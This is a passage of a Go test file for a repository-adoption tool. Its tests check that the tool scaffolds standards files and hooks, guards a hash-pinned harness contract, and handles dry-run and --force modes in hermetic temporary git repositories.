package adopt

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/cordanaLLM/praetor/internal/cavemansource"
	"github.com/cordanaLLM/praetor/internal/classify"
	"github.com/cordanaLLM/praetor/internal/config"
	"github.com/cordanaLLM/praetor/internal/forge"
	"github.com/cordanaLLM/praetor/internal/hisscatalog"
	"github.com/cordanaLLM/praetor/internal/paperclip"
	"gopkg.in/yaml.v3"
)

// maxSnapshotEntries bounds the tree walk of snapshotTree (HISS-02).
const maxSnapshotEntries = 10000

// requireGit skips tests that need a real git binary.
func requireGit(t *testing.T) string {
	t.Helper()
	gitPath, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git binary required")
	}
	return gitPath
}

// initTestGit creates the minimal layout git recognises as a repository (HEAD, objects/,
// refs/) so that git discovery stops at dir instead of walking up into an enclosing
// checkout when the test temp dir lives inside one.
func initTestGit(t *testing.T, dir string) {
	t.Helper()
	gitDir := filepath.Join(dir, ".git")
	for _, sub := range []string{"objects", "refs"} {
		if err := os.MkdirAll(filepath.Join(gitDir, sub), 0o755); err != nil {
			t.Fatalf("mkdir .git/%s: %v", sub, err)
		}
	}
	if err := os.WriteFile(filepath.Join(gitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644); err != nil {
		t.Fatalf("write HEAD: %v", err)
	}
}

func stageAdoptPaths(t *testing.T, dir string, paths ...string) {
	t.Helper()
	gitPath := requireGit(t)
	args := []string{"-C", dir, "add", "--"}
	args = append(args, paths...)
	cmd := exec.Command(gitPath, args...)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL="+os.DevNull)
	if output, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("stage adopted paths: %v (%s)", err, output)
	}
}

// hermeticPath restricts PATH to a stub directory plus the directory holding git, so
// that no lefthook or other tool from the developer machine is ever executed.
func hermeticPath(t *testing.T, stubDir string) {
	t.Helper()
	if os.PathSeparator == '\\' {
		t.Skip("POSIX shell stubs required")
	}
	gitPath := requireGit(t)
	t.Setenv("PATH", stubDir+string(os.PathListSeparator)+filepath.Dir(gitPath))
}

// writeStub writes an executable shell stub named name into dir.
func writeStub(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte("#!/bin/sh\n"+body), 0o700); err != nil {
		t.Fatalf("write stub %s: %v", name, err)
	}
}

// stubMkdir resolves mkdir for a shell stub before hermeticPath narrows PATH. hermeticPath
// keeps only git's directory, and that directory need not hold mkdir: inside a git hook
// (the pre-push gate) git puts its exec-path first, so git resolves to /usr/lib/git-core,
// and on macOS git lives in /usr/bin while mkdir lives in /bin.
func stubMkdir(t *testing.T) string {
	t.Helper()
	path, err := exec.LookPath("mkdir")
	if err != nil {
		t.Skipf("mkdir required for the lefthook stub: %v", err)
	}
	return path
}

// newTestRepo creates a hermetic leaf checkout named name under a fresh temp dir, whose
// origin remote names acme/<name> as a clone's does. Adoption reads identity from that
// remote alone, so a fixture without one exercises the unresolved-identity path instead of
// the adoption under test. lefthook is stubbed to fail so that the deterministic fallback
// hook path is exercised.
func newTestRepo(t *testing.T, name string) string {
	t.Helper()
	stubDir := t.TempDir()
	writeStub(t, stubDir, "lefthook", "exit 1\n")
	hermeticPath(t, stubDir)
	repoPath := filepath.Join(t.TempDir(), name)
	if err := os.MkdirAll(repoPath, 0o755); err != nil {
		t.Fatalf("mkdir repo: %v", err)
	}
	initTestGit(t, repoPath)
	writeOriginRemote(t, repoPath, "https://github.com/acme/"+name+".git")
	return repoPath
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", filepath.Dir(path), err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

// restoreMode makes a deliberately unreadable fixture removable again by t.TempDir.
func restoreMode(t *testing.T, path string) {
	t.Helper()
	if err := os.Chmod(path, 0o644); err != nil {
		t.Logf("restore mode of %s: %v", path, err)
	}
}

func mustRead(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	return string(data)
}

// snapshotTree maps every entry under dir to a content hash, "dir", or "link:" and its target.
func snapshotTree(t *testing.T, dir string) map[string]string {
	t.Helper()
	snap := make(map[string]string)
	count := 0
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		count++
		if count > maxSnapshotEntries {
			return filepath.SkipAll
		}
		rel, relErr := filepath.Rel(dir, path)
		if relErr != nil {
			return relErr
		}
		if info.IsDir() {
			snap[rel] = "dir"
			return nil
		}
		// Walk does not follow a symlink; record the link itself instead of reading through it.
		if info.Mode()&os.ModeSymlink != 0 {
			target, linkErr := os.Readlink(path)
			snap[rel] = "link:" + target
			return linkErr
		}
		data, readErr := os.ReadFile(path)
		if readErr != nil {
			return readErr
		}
		sum := sha256.Sum256(data)
		snap[rel] = hex.EncodeToString(sum[:])
		return nil
	})
	if err != nil {
		t.Fatalf("snapshot %s: %v", dir, err)
	}
	return snap
}

func assertTreeUnchanged(t *testing.T, before, after map[string]string) {
	t.Helper()
	if len(before) != len(after) {
		t.Fatalf("the tree changed: %d entries before, %d after", len(before), len(after))
	}
	for rel, hash := range before {
		if after[rel] != hash {
			t.Fatalf("%s modified", rel)
		}
	}
}

func assertNoIssues(t *testing.T, rep *AdoptReport) {
	t.Helper()
	if len(rep.Errors) > 0 {
		t.Fatalf("unexpected report errors: %v", rep.Errors)
	}
}

func hasAction(rep *AdoptReport, path, action string) bool {
	for _, d := range rep.ActionDetails {
		if d.Path == path && d.Action == action {
			return true
		}
	}
	return false
}

func contains(list []string, item string) bool {
	for _, v := range list {
		if v == item {
			return true
		}
	}
	return false
}

// =========================================================================
// Positive 3D Tests
// =========================================================================

func TestAdopt_Positive_Greenfield(t *testing.T) {
	repoPath := newTestRepo(t, "new-service")
	mustWrite(t, filepath.Join(repoPath, "go.mod"), "module github.com/test/service\n")

	report, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", RecordBaseline: true})
	if err != nil {
		t.Fatalf("Adopt greenfield failed: %v", err)
	}
	assertNoIssues(t, report)
	assertAdoptedLock(t, repoPath)
	if report.State != StateGreenfield {
		t.Fatalf("expected state greenfield, got: %s", report.State)
	}
	if report.Archetype != "framework" {
		t.Fatalf("expected framework archetype, got: %s", report.Archetype)
	}

	expectedCreated := []string{
		".standards.yaml", ".standards.lock", ".standards-baseline.json", "AGENTS.md", "CLAUDE.md",
		".devcontainer/devcontainer.json", "Makefile", ".gitignore", ".vscode/settings.json",
		".git/hooks/pre-commit",
	}
	for _, ef := range expectedCreated {
		if !contains(report.CreatedFiles, ef) {
			t.Errorf("expected %s in CreatedFiles, got %v", ef, report.CreatedFiles)
		}
		if contains(report.ReconciledFiles, ef) {
			t.Errorf("greenfield file %s must not be reported as reconciled", ef)
		}
		if _, err := os.Stat(filepath.Join(repoPath, ef)); err != nil {
			t.Errorf("expected file %s to exist after greenfield adoption: %v", ef, err)
		}
	}

	agents := mustRead(t, filepath.Join(repoPath, "AGENTS.md"))
	if !strings.HasSuffix(strings.TrimSpace(agents), harnessEndMarker) {
		t.Error("greenfield AGENTS.md must end with the harness end marker")
	}
	makefile := mustRead(t, filepath.Join(repoPath, "Makefile"))
	if !strings.Contains(makefile, "verify-all: compile-context-verify caveman-sources audit test") ||
		!strings.Contains(makefile, "caveman check --configured-sources") {
		t.Errorf("greenfield verify-all must run the real gates, got:\n%s", makefile)
	}
	if strings.Contains(makefile, "Running verification...") {
		t.Error("greenfield verify-all must not be an echo placeholder")
	}
	hook := mustRead(t, filepath.Join(repoPath, ".git", "hooks", "pre-commit"))
	if !strings.Contains(hook, fallbackPreCommitMarker) || strings.Contains(hook, "./bin/") {
		t.Errorf("fallback hook must be praetor-managed and never execute a repository-relative binary:\n%s", hook)
	}
	for _, vendor := range []string{".claude", ".codex", ".github", ".gemini"} {
		path := filepath.Join(repoPath, vendor, "agents", "repo-auditor.md")
		if _, err := os.Stat(path); err != nil {
			t.Errorf("agent definition projection missing at %s: %v", path, err)
		}
	}
}

func TestAdoptGreenfieldConfiguredSourcesVerifyWrittenHarness(t *testing.T) {
	repoPath := newTestRepo(t, "source-gate")
	mustWrite(t, filepath.Join(repoPath, "go.mod"), "module github.com/test/source-gate\n")
	if _, err := Adopt(t.Context(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath,
		Profile: "framework", RecordBaseline: true}); err != nil {
		t.Fatal(err)
	}
	stageAdoptPaths(t, repoPath, paperclipFile)
	manifest, err := config.LoadManifest(filepath.Join(repoPath, manifestFile))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := cavemansource.ExtractDeclared(t.Context(), repoPath, manifest.Register.Sources); err != nil {
		t.Fatalf("fresh adoption source gate failed: %v", err)
	}
}

func TestAdoptExistingManifestAddsSourceContractWithoutDroppingContent(t *testing.T) {
	repoPath := newTestRepo(t, "existing-source-gate")
	mustWrite(t, filepath.Join(repoPath, "go.mod"), "module github.com/test/existing-source-gate\n")
	mustWrite(t, filepath.Join(repoPath, manifestFile), `# operator manifest comment
version: 1
repository:
  owner: custom
  name: existing-source-gate
  visibility: private
  description: "keep this description"
profiles: [framework]
register:
  surfaces:
    hooks: internal
`)
	if _, err := Adopt(t.Context(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath,
		Profile: "framework", RecordBaseline: true}); err != nil {
		t.Fatal(err)
	}
	stageAdoptPaths(t, repoPath, paperclipFile)
	manifest, err := config.LoadManifest(filepath.Join(repoPath, manifestFile))
	if err != nil {
		t.Fatal(err)
	}
	if manifest.Register == nil || manifest.Register.Sources == nil {
		t.Fatal("existing manifest did not gain register.sources")
	}
	if _, err := cavemansource.ExtractDeclared(t.Context(), repoPath, manifest.Register.Sources); err != nil {
		t.Fatalf("existing-manifest source gate failed: %v", err)
	}
	text := mustRead(t, filepath.Join(repoPath, manifestFile))
	for _, retained := range []string{"# operator manifest comment", "keep this description", "hooks: internal"} {
		if !strings.Contains(text, retained) {
			t.Fatalf("existing manifest content dropped: %q\n%s", retained, text)
		}
	}
}

func TestAdoptCustomHarnessPreservesBytesAndBindsActualCoverage(t *testing.T) {
	repoPath := newTestRepo(t, "custom-source-harness")
	mustWrite(t, filepath.Join(repoPath, "go.mod"), "module github.com/test/custom-source-harness\n")
	custom := `{
  "version": 1,
  "platform": "custom/source-harness",
  "operating_contract": ["result: custom contract."],
  "agit_push_format": "git push custom",
  "invariants": ["result: custom invariant."]
}
`
	mustWrite(t, filepath.Join(repoPath, paperclipFile), custom)
	if _, err := Adopt(t.Context(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath,
		Profile: "framework", RecordBaseline: true}); err != nil {
		t.Fatal(err)
	}
	if got := mustRead(t, filepath.Join(repoPath, paperclipFile)); got != custom {
		t.Fatalf("custom harness changed:\n%s", got)
	}
	stageAdoptPaths(t, repoPath, paperclipFile)
	manifest, err := config.LoadManifest(filepath.Join(repoPath, manifestFile))
	if err != nil {
		t.Fatal(err)
	}
	result, err := cavemansource.ExtractDeclared(t.Context(), repoPath, manifest.Register.Sources)
	if err != nil || len(result.Sources) != 2 {
		t.Fatalf("custom harness source gate: values=%d err=%v", len(result.Sources), err)
	}
}

// editedContractRow replaces one row of the current operating contract, the kind of edit that
// makes a harness operator-owned.
const editedContractRow = "Timeout != failure. Re-check open PRs and CI before retry; prevent duplicate PRs."

// editOperatingContract returns the generated harness with its timeout row replaced by
// editedContractRow.
func editOperatingContract(t *testing.T, generated string) string {
	t.Helper()
	edited := strings.Replace(generated, "Timeout != failure. Re-check open PRs before retry; prevent duplicate PRs.", editedContractRow, 1)
	if edited == generated {
		t.Fatal("fixture precondition: the generated harness lacks the timeout row")
	}
	return edited
}

// TestAdoptEditedHarnessFailsBeforeWritingWithRemedy (#502 U9) Negative: the realistic path.
// adopt writes the harness and binds register.sources to it; the operator edits a contract row
// and does not re-bind. Adoption never re-blesses that drift, plain or --force: the run stops
// before its first write, and the error names both remedies. The second one, deleting the
// harness and re-running adopt, regenerates the bytes the contract was bound to. The first,
// recomputing the pins with the named command, is TestAdoptForceEditedHarnessNeedsRecomputedPins
// in cmd/standardsctl.
func TestAdoptEditedHarnessFailsBeforeWritingWithRemedy(t *testing.T) {
	repoPath := newTestRepo(t, "legacy")
	mustWrite(t, filepath.Join(repoPath, manifestFile), legacyManifest)
	if _, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, false)); err != nil {
		t.Fatal(err)
	}
	harnessPath := filepath.Join(repoPath, paperclipFile)
	generated := mustRead(t, harnessPath)
	mustWrite(t, harnessPath, editOperatingContract(t, generated))
	before := snapshotTree(t, repoPath)
	for _, force := range []bool{false, true} {
		_, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, force))
		for _, want := range []string{"register.sources sha256 mismatch",
			"recompute the pins with `praetorctl caveman check --configured-sources --root=.`",
			"delete it and re-run praetorctl adopt to regenerate it"} {
			if err == nil || !strings.Contains(err.Error(), want) {
				t.Fatalf("force=%v: error lacks %q: %v", force, want, err)
			}
		}
		assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	}
	if err := os.Remove(harnessPath); err != nil {
		t.Fatal(err)
	}
	if _, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, false)); err != nil {
		t.Fatalf("adopt after deleting the edited harness: %v", err)
	}
	if got := mustRead(t, harnessPath); got != generated {
		t.Fatalf("deleted harness not regenerated to the bound bytes:\n%s", got)
	}
	requirePassingSourceGate(t, repoPath, paperclipFile)
}

// TestAdoptForceKeepsReboundEditedOperatingContract (#502) Positive, the already re-bound case:
// once the operator has recomputed the pins for the edited operating contract (the remedy
// TestAdoptEditedHarnessFailsBeforeWritingWithRemedy names), --force keeps the harness byte for
// byte, rules.md included, and the re-bound contract stays bound, so the source gate and the
// platform check audit runs stay green.
func TestAdoptForceKeepsReboundEditedOperatingContract(t *testing.T) {
	repoPath := newTestRepo(t, "legacy")
	mustWrite(t, filepath.Join(repoPath, manifestFile), legacyManifest)
	if _, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, false)); err != nil {
		t.Fatal(err)
	}
	edited := editOperatingContract(t, mustRead(t, filepath.Join(repoPath, paperclipFile)))
	bound, err := managedRegisterSources(t.Context(), []byte(edited))
	if err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(repoPath, paperclipFile), edited)
	mustWrite(t, filepath.Join(repoPath, manifestFile), legacyManifest+manifestSourcesYAML(t, bound))
	rules := mustRead(t, filepath.Join(repoPath, ".paperclip", "rules.md"))
	report, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, true))
	if err != nil {
		t.Fatal(err)
	}
	if got := mustRead(t, filepath.Join(repoPath, paperclipFile)); got != edited {
		t.Fatalf("--force rewrote the operator-owned harness:\n%s", got)
	}
	if got := mustRead(t, filepath.Join(repoPath, ".paperclip", "rules.md")); got != rules {
		t.Fatalf("--force rewrote rules.md of a kept harness:\n%s", got)
	}
	if hasAction(report, paperclipFile, actionCreate) || hasAction(report, paperclipFile, actionReplace) ||
		!strings.Contains(reportDetail(report, paperclipFile), "operator-owned Paperclip harness kept") {
		t.Fatalf("kept harness misreported: %+v", report.ActionDetails)
	}
	if got := requirePassingSourceGate(t, repoPath, paperclipFile); got.SHA256 != bound.SHA256 {
		t.Fatalf("contract re-bound away from the kept harness: %s, want %s", got.SHA256, bound.SHA256)
	}
	if h, err := paperclip.LoadHarness(filepath.Join(repoPath, paperclipFile)); err != nil || h.Platform != "acme/legacy" {
		t.Fatalf("kept harness fails the audit platform check: %+v %v", h, err)
	}
}

// TestAdoptInvalidHarnessStillErrors (#502) Negative: --force no longer bypasses the harness
// check, so an existing harness that does not validate fails adoption in both modes, as a plain
// run always did, and its bytes stay.
func TestAdoptInvalidHarnessStillErrors(t *testing.T) {
	for _, force := range []bool{false, true} {
		repoPath := newTestRepo(t, "legacy")
		mustWrite(t, filepath.Join(repoPath, manifestFile), legacyManifest)
		invalid := `{"version": 1, "platform": "acme/legacy",` + "\n"
		mustWrite(t, filepath.Join(repoPath, paperclipFile), invalid)
		_, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, force))
		if err == nil || !strings.Contains(err.Error(), "validate existing source coverage harness") {
			t.Fatalf("force=%v: invalid harness accepted: %v", force, err)
		}
		if got := mustRead(t, filepath.Join(repoPath, paperclipFile)); got != invalid {
			t.Fatalf("force=%v: invalid harness rewritten:\n%s", force, got)
		}
	}
}

// renamedHarness is an operator-owned harness naming the repository's old identity, with a
// member this release does not know and a value in the \u003c escaped form json.MarshalIndent
// writes into a released harness.
const renamedHarness = `{
  "version": 1,
  "notes": "operator: keep this member",
  "platform": "acme/renamed",
  "operating_contract": ["result: custom contract."],
  "agit_push_format": "git push custom",
  "invariants": ["result: func LOC \u003c= 75."]
}
`

// TestAdoptForcePatchesOnlyHarnessPlatform (#502) Boundary: an operator-owned harness naming
// another repository keeps its bytes on a plain run, with a warning naming --force; --force
// then sets platform and nothing else, in the file's own line endings, reports the replace with
// its delta, binds the contract to the patched bytes, and a second --force changes nothing.
func TestAdoptForcePatchesOnlyHarnessPlatform(t *testing.T) {
	for name, eol := range map[string]string{"LF": "\n", "CRLF": "\r\n"} {
		t.Run(name, func(t *testing.T) {
			repoPath := newTestRepo(t, "legacy")
			original := strings.ReplaceAll(renamedHarness, "\n", eol)
			mustWrite(t, filepath.Join(repoPath, manifestFile), legacyManifest)
			mustWrite(t, filepath.Join(repoPath, paperclipFile), original)
			plain, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, false))
			if err != nil {
				t.Fatal(err)
			}
			if got := mustRead(t, filepath.Join(repoPath, paperclipFile)); got != original ||
				!strings.Contains(strings.Join(plain.Warnings, "\n"), `audit expects "acme/legacy". Re-run adopt with --force`) {
				t.Fatalf("plain run: harness changed or mismatch not warned: %v", plain.Warnings)
			}
			forced, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, true))
			if err != nil {
				t.Fatal(err)
			}
			patched := mustRead(t, filepath.Join(repoPath, paperclipFile))
			assertOnlyPlatformChanged(t, original, patched)
			detail := reportDetail(forced, paperclipFile)
			if !hasAction(forced, paperclipFile, actionReplace) ||
				!strings.Contains(detail, "Set platform of the operator-owned Paperclip harness to acme/legacy") ||
				!strings.Contains(detail, `(-1/+1 lines, removed "  \"platform\": \"acme/renamed\","`) {
				t.Fatalf("platform patch not reported as a one-line replace: %+v", forced.ActionDetails)
			}
			requirePassingSourceGate(t, repoPath, paperclipFile)
			again, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, true))
			if err != nil {
				t.Fatal(err)
			}
			if got := mustRead(t, filepath.Join(repoPath, paperclipFile)); got != patched || hasAction(again, paperclipFile, actionReplace) {
				t.Fatalf("second --force changed the patched harness:\n%s", got)
			}
		})
	}
}

// TestAdoptForceKeepsHarnessItCannotPatch (#502) Boundary: a harness the loader accepts but
// PatchPlatform refuses (a duplicate member, which the order-keeping rewrite cannot carry) stays
// byte for byte, and a warning says the platform was not checked or set, on a plain run as under
// --force: its platform goes uncompared, so silence would leave a mismatch for audit to find.
// Its contract selects only a hook, so no source extraction reads the harness first.
func TestAdoptForceKeepsHarnessItCannotPatch(t *testing.T) {
	for _, force := range []bool{false, true} {
		repoPath := newTestRepo(t, "legacy")
		duplicate := strings.Replace(renamedHarness, `"version": 1,`, `"version": 1, "notes": "first",`, 1)
		mustWrite(t, filepath.Join(repoPath, paperclipFile), duplicate)
		mustWrite(t, filepath.Join(repoPath, "hooks", "notify.sh"), "echo \"result: hook pass.\"\n")
		inputs := []config.RegisterSourceInput{{Path: "hooks/notify.sh", Surface: config.SurfaceHooks,
			Kind: "message", Format: config.SourceFormatShell}}
		result, err := cavemansource.ExtractInputs(t.Context(), repoPath, inputs)
		if err != nil {
			t.Fatal(err)
		}
		mustWrite(t, filepath.Join(repoPath, manifestFile), legacyManifest+manifestSourcesYAML(t, &config.RegisterSources{
			Expected: result.Applicable, NotApplicable: result.NotApplicable, SHA256: result.SHA256, Inputs: inputs}))
		report, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, force))
		if err != nil {
			t.Fatalf("force=%v: %v", force, err)
		}
		if got := mustRead(t, filepath.Join(repoPath, paperclipFile)); got != duplicate || hasAction(report, paperclipFile, actionReplace) {
			t.Fatalf("force=%v: unpatchable harness rewritten:\n%s", force, got)
		}
		if !strings.Contains(strings.Join(report.Warnings, "\n"), "platform not checked or set, harness kept as written") {
			t.Fatalf("force=%v: unpatchable harness not warned: %v", force, report.Warnings)
		}
	}
}

// assertOnlyPlatformChanged holds patched to original with only the platform value set to
// acme/legacy: every other byte, the escaped invariant and the line endings included, stays.
func assertOnlyPlatformChanged(t *testing.T, original, patched string) {
	t.Helper()
	want := strings.Replace(original, `"platform": "acme/renamed"`, `"platform": "acme/legacy"`, 1)
	if want == original || patched != want {
		t.Fatalf("patch changed more than the platform value:\n%q\nwant:\n%q", patched, want)
	}
}

// TestAdoptForceKeepsDeletedRulesAbsent (#502) Boundary: --force no longer recreates a rules.md
// the operator deleted, beside the current harness (verified, nothing written) and beside a
// released harness it refreshes (PriorState.Rules).
func TestAdoptForceKeepsDeletedRulesAbsent(t *testing.T) {
	rulesPath := func(repoPath string) string { return filepath.Join(repoPath, ".paperclip", "rules.md") }
	current := newTestRepo(t, "legacy")
	mustWrite(t, filepath.Join(current, manifestFile), legacyManifest)
	if _, err := Adopt(t.Context(), sourceAdoptOptions(t, current, false)); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(rulesPath(current)); err != nil {
		t.Fatal(err)
	}
	released := newTestRepo(t, "legacy")
	mustWrite(t, filepath.Join(released, manifestFile), legacyManifest)
	mustWrite(t, filepath.Join(released, paperclipFile), releasedHarness(t, "harness.json.golden"))
	for name, repoPath := range map[string]string{"current": current, "released": released} {
		report, err := Adopt(t.Context(), sourceAdoptOptions(t, repoPath, true))
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if _, err := os.Stat(rulesPath(repoPath)); !os.IsNotExist(err) {
			t.Fatalf("%s: --force recreated the deleted rules.md: %v", name, err)
		}
		if hasAction(report, paperclipFile, actionCreate) {
			t.Fatalf("%s: existing harness reported as created: %+v", name, report.ActionDetails)
		}
		requirePassingSourceGate(t, repoPath, paperclipFile)
	}
}

func TestAdoptRejectsStaleExistingSourceContract(t *testing.T) {
	repoPath := newTestRepo(t, "stale-source-contract")
	mustWrite(t, filepath.Join(repoPath, "go.mod"), "module github.com/test/stale-source-contract\n")
	options := AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath,
		Profile: "framework", RecordBaseline: true}
	if _, err := Adopt(t.Context(), options); err != nil {
		t.Fatal(err)
	}
	stageAdoptPaths(t, repoPath, paperclipFile)
	manifestPath := filepath.Join(repoPath, manifestFile)
	manifest, err := config.LoadManifest(manifestPath)
	if err != nil {
		t.Fatal(err)
	}
	validDigest := manifest.Register.Sources.SHA256
	staleDigest := "sha256:" + strings.Repeat("0", sha256.Size*2)
	mustWrite(t, manifestPath, strings.Replace(mustRead(t, manifestPath), validDigest, staleDigest, 1))
	report, err := Adopt(t.Context(), options)
	if err == nil || !strings.Contains(err.Error(), "fails its configured gate") {
		t.Fatalf("stale source contract reported adoption success: report=%+v err=%v", report, err)
	}
}

func TestAdopt_Positive_PartialAndDryRun(t *testing.T) {
	repoPath := newTestRepo(t, "partial-repo")
	mustWrite(t, filepath.Join(repoPath, ".standards.yaml"), "version: 1\n")

	before := snapshotTree(t, repoPath)
	repDry, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, DryRun: true})
	if err != nil {
		t.Fatalf("Adopt dry-run failed: %v", err)
	}
	assertNoIssues(t, repDry)
	assertTreeUnchanged(t, before, snapshotTree(t, repoPath))
	if repDry.State != StatePartial {
		t.Fatalf("expected partial state, got: %s", repDry.State)
	}

	repLive, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("Adopt live failed: %v", err)
	}
	assertNoIssues(t, repLive)
	if _, err := os.Stat(filepath.Join(repoPath, ".standards.lock")); err != nil {
		t.Fatal("live adopt should create missing .standards.lock")
	}
	if !contains(repLive.ReconciledFiles, ".standards.yaml") {
		t.Fatalf("expected the pre-existing manifest in ReconciledFiles, got %v", repLive.ReconciledFiles)
	}

	// Plan and execution classify the same files identically (dry-run vs live).
	for _, f := range repDry.CreatedFiles {
		if f == ".git/hooks/pre-commit" {
			continue // hooks are only activated in live mode
		}
		if !contains(repLive.CreatedFiles, f) {
			t.Errorf("dry-run planned %s as created but the live run reported it differently", f)
		}
	}
}

func TestAdopt_Positive_BrownfieldWithDebtRatcheting(t *testing.T) {
	repoPath := newTestRepo(t, "legacy-repo")
	mustWrite(t, filepath.Join(repoPath, "main.go"), "package main\nfunc run() {\n\t_ = doSomething()\n}\n")

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, RecordBaseline: true})
	if err != nil {
		t.Fatalf("Adopt brownfield failed: %v", err)
	}
	assertNoIssues(t, rep)
	if rep.LegacyDebtCount != 1 {
		t.Fatalf("expected 1 legacy infraction recorded, got: %d", rep.LegacyDebtCount)
	}
	if rep.BaselineStatus != "scanned" {
		t.Fatalf("expected completed baseline scan, got %q", rep.BaselineStatus)
	}
	if len(mustRead(t, filepath.Join(repoPath, ".standards-baseline.json"))) == 0 {
		t.Fatal("baseline file should not be empty")
	}

	// A second live run on the now fully scaffolded repository observes brownfield state.
	rep2, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath})
	if err != nil {
		t.Fatalf("second Adopt failed: %v", err)
	}
	assertNoIssues(t, rep2)
	if rep2.State != StateBrownfield {
		t.Fatalf("expected brownfield state on the second run, got %s", rep2.State)
	}
	if rep2.LegacyDebtCount != 1 {
		t.Fatalf("existing baseline debt must be reported, got %d", rep2.LegacyDebtCount)
	}
	if rep2.BaselineStatus != "existing" {
		t.Fatalf("expected existing baseline status, got %q", rep2.BaselineStatus)
	}
}

func TestAdopt_Positive_ExplicitFacetsAndSkipGitValidation(t *testing.T) {
	stubDir := t.TempDir()
	writeStub(t, stubDir, "lefthook", "exit 1\n")
	hermeticPath(t, stubDir)
	repoPath := filepath.Join(t.TempDir(), "no-git")
	if err := os.MkdirAll(repoPath, 0o755); err != nil {
		t.Fatal(err)
	}

	rep, err := Adopt(context.Background(), AdoptOptions{
		LockSourceRoot:    newAdoptLockSource(t),
		Path:              repoPath,
		Facets:            []string{"custom:facet"},
		SkipGitValidation: true,
		DryRun:            true,
	})
	if err != nil {
		t.Fatalf("Adopt with SkipGitValidation failed: %v", err)
	}
	assertNoIssues(t, rep)
	if len(rep.Facets) != 1 || rep.Facets[0] != "custom:facet" {
		t.Fatalf("explicit facets must be honoured, got %v", rep.Facets)
	}
}

func TestAdopt_Positive_ForceRegeneratesScaffolds(t *testing.T) {
	repoPath := newTestRepo(t, "force-repo")
	mustWrite(t, filepath.Join(repoPath, "lefthook.yml"), "pre-commit:\n  commands:\n    custom:\n      run: echo custom\n")
	// The label taxonomy is repository configuration, not a scaffold: --force keeps it (BUG-287).
	const labels = "version: 0\n"
	mustWrite(t, filepath.Join(repoPath, ".config", "labels.yaml"), labels)

	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Force: true})
	if err != nil {
		t.Fatalf("Adopt --force failed: %v", err)
	}
	assertNoIssues(t, rep)
	// The replaced configuration is reported as replaced, never as created, and its prior bytes
	// are kept under the run's backup directory, which the managed .gitignore block ignores.
	if contains(rep.CreatedFiles, "lefthook.yml") || !hasAction(rep, "lefthook.yml", actionReplace) {
		t.Fatalf("--force must replace the drifted scaffold, got created=%v actions=%+v", rep.CreatedFiles, rep.ActionDetails)
	}
	backups, err := filepath.Glob(filepath.Join(repoPath, filepath.FromSlash(adoptBackupRoot), "*", "lefthook.yml"))
	if err != nil || len(backups) != 1 || mustRead(t, backups[0]) != "pre-commit:\n  commands:\n    custom:\n      run: echo custom\n" {
		t.Fatalf("backup of the replaced lefthook.yml = %v (err %v)", backups, err)
	}
	if contains(rep.CreatedFiles, ".config/labels.yaml") || mustRead(t, filepath.Join(repoPath, ".config", "labels.yaml")) != labels {
		t.Errorf("--force must keep the existing label taxonomy, got created=%v", rep.CreatedFiles)
	}
	if mustRead(t, filepath.Join(repoPath, "lefthook.yml")) != buildLefthookYAML() {
		t.Error("--force must replace lefthook.yml with the praetor configuration")
	}
	if !contains(rep.CreatedFiles, ".git/hooks/pre-commit") {
		t.Errorf("praetor-written lefthook.yml must be activated, got %v", rep.CreatedFiles)
	}
}

// =========================================================================
// Negative 3D Tests
// =========================================================================

func TestAdopt_Negative_NilContext(t *testing.T) {
	_, err := Adopt(nil, AdoptOptions{Path: t.TempDir()}) //nolint:staticcheck // exercising the nil-context contract
	if err == nil {
		t.Fatal("expected error with nil context")
	}
}

func TestAdopt_Negative_CancelledContext(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := Adopt(ctx, AdoptOptions{Path: t.TempDir()}); err == nil {
		t.Fatal("expected error with cancelled context")
	}
}

func TestAdopt_Negative_NonExistentPath(t *testing.T) {
